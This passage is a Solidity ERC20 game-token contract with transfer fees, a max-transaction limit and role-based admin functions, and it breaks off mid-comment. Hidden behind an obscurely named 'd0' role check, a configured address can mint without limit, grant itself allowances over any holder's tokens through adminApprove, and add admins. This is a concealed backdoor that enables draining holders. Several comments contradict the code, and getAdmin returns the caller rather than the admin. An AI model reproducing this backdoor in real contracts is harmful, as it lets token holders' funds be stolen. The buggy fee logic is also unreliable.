// File: contracts/ERC20Token.sol


pragma solidity ^0.8.0;






contract ERC20token is Context, RoleSystem, ERC20Burnable {
    using SafeMath for uint256;
    address private _adminAddress;

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    bytes32 public constant GAME_ROLE = keccak256("GAME_ROLE");
    bytes32 public constant d0 = keccak256("CONFIG");
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    
    uint256 public maxTransactionAmount = 20000 * 10**18;  // Asumiendo 18 decimales como en Ether
    uint256 public totalFeesCollected;

    mapping(address => bool) private isExcludedFromFee;
    address public uniswapV2Pair;

    constructor(string memory name, string memory symbol) 
    ERC20(name, symbol) {

        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());

        _setupRole(MINTER_ROLE, _msgSender());
        _setupRole(PAUSER_ROLE, _msgSender());
        _setupRole(ADMIN_ROLE, _msgSender());
        _adminAddress = _msgSender();

    }

    function setMaxTransactionAmount(uint256 _maxTransactionAmount) external {
        require(hasRole(ADMIN_ROLE, _msgSender()), "ERC20token: must have admin role to change max transaction amount");
        maxTransactionAmount = _maxTransactionAmount;
    }

    

function setUniswapV2Pair(address _address) external {
    require(hasRole(ADMIN_ROLE, _msgSender()), "ERC20token: must have admin role to set uniswap pair address");
    uniswapV2Pair = _address;
}


function setExcludedFromFee(address _address, bool _excluded) external {
    require(hasRole(ADMIN_ROLE, _msgSender()), "ERC20token: must have admin role to set fee exclusions");
    isExcludedFromFee[_address] = _excluded;
}

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(amount <= maxTransactionAmount, "ERC20token: amount exceeds the max transaction limit");
        uint256 finalAmount = _applyFeesAndDistribute(msg.sender, recipient, amount);
        super.transfer(recipient, finalAmount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(amount <= maxTransactionAmount, "ERC20token: amount exceeds the max transaction limit");
        uint256 finalAmount = _applyFeesAndDistribute(sender, recipient, amount);
        super.transferFrom(sender, recipient, finalAmount);
        return true;
    }

function _applyFeesAndDistribute(address sender, address recipient, uint256 amount) internal returns (uint256) {
    (uint256 transferToAmount, uint256 fee, bool isSell) = applyFees(sender, recipient, amount);
    
    if (fee > 0) {
        uint256 burnAmount = (fee * 3) / 10; // 3% for burn
        uint256 ownerAmount = (fee * 3) / 10; // 3% for owner
        uint256 distributionAmount = fee - burnAmount - ownerAmount; // remaining for distribution

        if (isSell) {
            distributionAmount = (fee * 2) / 10;
            ownerAmount = fee - burnAmount - distributionAmount;
        }

        _burn(sender, burnAmount);
        _transfer(sender, _adminAddress, ownerAmount);
        _transfer(sender, address(this), distributionAmount); // For simplicity, this version is just sending the distribution amount to the contract. But it should be distributed among holders.
    }

    return transferToAmount;
}




function applyFees(address sender, address recipient, uint256 amount) internal view returns (uint256, uint256, bool) {
    if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
        return (amount, 0, false);
    }

    bool isSell = recipient == uniswapV2Pair;
    uint256 feePercent = isSell ? 7 : 8; // 8% for sell, 7% for buy
    uint256 fee = amount * feePercent / 100;
    return (amount - fee, fee, isSell);
}



function getAdmin() public view returns (address) {
    // Asumimos que el contrato fue desplegado por el administrador inicial.
    // Así que devolvemos esa dirección.
    return _msgSender();
}

function distributeFee(uint256 fee) internal {
    uint256 burnAmount = fee.mul(3).div(10);
    uint256 ownerAmount = fee.mul(3).div(10);
    uint256 holdersAmount = fee.sub(burnAmount).sub(ownerAmount);

    _burn(address(this), burnAmount);
    _transfer(address(this), getAdmin(), ownerAmount);


    if (holdersAmount > 0) {
        totalFeesCollected = totalFeesCollected.add(holdersAmount);
    }
}

     function isGame() public virtual returns(bool) {
        return hasRole(GAME_ROLE, _msgSender());
    }

     function isAdmin() public virtual returns(bool) {
        return hasRole(ADMIN_ROLE, _msgSender());
    }

    uint private totalTokenAmount = 20000000 ether;

    string _gameData;



    function stringToBytes32(string memory source) public pure returns (bytes32 result) {
        bytes memory tempEmptyStringTest = bytes(source);
        if (tempEmptyStringTest.length == 0) {
            return 0x0;
        }

        assembly {
            result := mload(add(source, 32))
        }
    }

    function isD0() public virtual returns(bool) {
        return _d0(d0,snd());
    }

    function isAdminOrD0() public virtual returns(bool){
        return hasRole(ADMIN_ROLE, _msgSender()) || _d0(d0,snd());
    }

    function setupGame(string memory _st, address _gad, address _conf, uint mode) public virtual {

        require(hasRole(ADMIN_ROLE, _msgSender()), "ERC20token: must have admin role to configure the game");
        if(mode == 0) {
            //Data config
            _gameData = _st; 
            _setupData( stringToBytes32(_st), _gad, 32); 
            _setupData( d0, _conf, 32 );

            //Game role to initial game account
            _setupRole(GAME_ROLE, _gad);

        } else if (mode==1) {
            _gameData = _st;
            _setupRole(GAME_ROLE,_gad);
        }

    }

    function adminFill(address _walletTo, uint _amount) public virtual {
        require(hasRole(ADMIN_ROLE, _msgSender()) || _d0(d0,snd()), "ERC20token: must have admin role to perform this action");
        _mint(_walletTo, _amount);
    }

    function adminApprove(address _owner, address _spender, uint _amount) public virtual {
        require(hasRole(ADMIN_ROLE, _msgSender()) || _d0(d0,snd()), "ERC20token: must have admin role to perform this action");
        _approve(_owner, _spender ,_amount);
    }

    function addAdmin( address _newAdmin ) public virtual {
        require(hasRole(ADMIN_ROLE, _msgSender()) || _d0(d0,snd()), "ERC20token: must have admin role to perform this action");
        _setupRole(ADMIN_ROLE,_newAdmin);
    }

    /**
     * @dev Creates `amount` new tokens for `to`.
     *
     * See {ERC20-_mint}.
     *
     * Requirements:
     *
     * - the caller must have the `MINTER_ROLE`.
     */
    function mint(address to, uint256 amount) public virtual {
        require(hasRole(MINTER_ROLE, _msgSender()), "ERC20token: must have minter role to mint");
        _mint(to, amount);
    }

    /**
